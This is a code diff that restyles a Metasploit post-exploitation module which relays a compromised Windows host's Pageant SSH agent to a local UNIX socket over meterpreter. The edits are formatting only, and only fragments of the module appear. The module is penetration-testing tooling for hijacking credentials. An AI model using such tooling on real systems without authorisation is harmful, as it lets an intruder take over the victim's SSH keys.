@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -30,12 +31,12 @@ class MetasploitModule < Msf::Post
                         'Ben Campbell', # A HUGE amount of support in this :-)
                       ],
                       'Platform'      => [ 'win' ],
-                      'SessionTypes'  => [ 'meterpreter' ]
-                     ))
+                      'SessionTypes'  => [ 'meterpreter' ]))
     register_options(
       [
         OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def setup
@@ -50,7 +51,6 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
   def run
     # Check to ensure that UNIX sockets are supported
     begin
@@ -61,11 +61,11 @@ class MetasploitModule < Msf::Post
     end
 
     # Get the socket path from the user supplied options (or leave it blank to get the plugin to choose one)
-    if datastore['SocketPath']
-      @sockpath = datastore['SocketPath'].to_s
-    else
-      @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
-    end
+    @sockpath = if datastore['SocketPath']
+                  datastore['SocketPath'].to_s
+                else
+                  "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
+                end
 
     # Quit if the file exists, so that we don't accidentally overwrite something important on the host system
     if ::File.exist?(@sockpath)
@@ -89,8 +89,8 @@ class MetasploitModule < Msf::Post
           if response[:success]
             begin
               s.send response[:blob], 0
-          rescue
-            break
+            rescue
+              break
             end
             vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{translate_error(response[:error])}')")
           else
@@ -103,31 +103,31 @@ class MetasploitModule < Msf::Post
 
   def cleanup
     # Remove the socket that we created, if it still exists
-    ::File.delete(@sockpath) if ::File.exist?(@sockpath) if @sockpath
+    ::File.delete(@sockpath) if @sockpath && ::File.exist?(@sockpath)
   end
 
   def translate_error(errnum)
     errstring = "#{errnum}: "
-    case errnum
-    when 0
-      errstring += "No error"
-    when 1
-      errstring += "The Pageant request was not processed."
-    when 2
-      errstring += "Unable to obtain IPC memory address."
-    when 3
-      errstring += "Unable to allocate memory for Pageant<-->Meterpreter IPC."
-    when 4
-      errstring += "Unable to allocate memory buffer."
-    when 5
-      errstring += "Unable to build Pageant request string."
-    when 6
-      errstring += "Pageant not found."
-    when 7
-      errstring += "Not forwarded."
-    else
-      errstring += "Unknown."
-    end
+    errstring += case errnum
+                 when 0
+                   "No error"
+                 when 1
+                   "The Pageant request was not processed."
+                 when 2
+                   "Unable to obtain IPC memory address."
+                 when 3
+                   "Unable to allocate memory for Pageant<-->Meterpreter IPC."
+                 when 4
+                   "Unable to allocate memory buffer."
+                 when 5
+                   "Unable to build Pageant request string."
+                 when 6
+                   "Pageant not found."
+                 when 7
+                   "Not forwarded."
+                 else
+                   "Unknown."
+                 end
     errstring
   end
 end
